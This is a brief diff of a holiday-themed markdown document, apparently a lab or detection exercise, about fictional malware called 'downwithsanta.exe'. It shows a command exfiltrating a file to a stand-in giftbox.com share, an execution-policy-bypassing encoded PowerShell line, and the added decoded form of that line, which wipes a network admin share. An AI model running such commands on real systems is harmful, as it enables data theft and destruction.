@@ -90,3 +90,6 @@ downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file
 ```powershell
 C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc QzpcV2luZG93c1xTeXN0ZW0zMlxkb3dud2l0aHNhbnRhLmV4ZSAtLXdpcGVhbGwgXFxcXE5vcnRoUG9sZWZpbGVzaGFyZVxcYyQ=
 ```
+```powershell
+C:\Windows\System32\downwithsanta.exe --wipeall \\\\NorthPolefileshare\\c$
+```
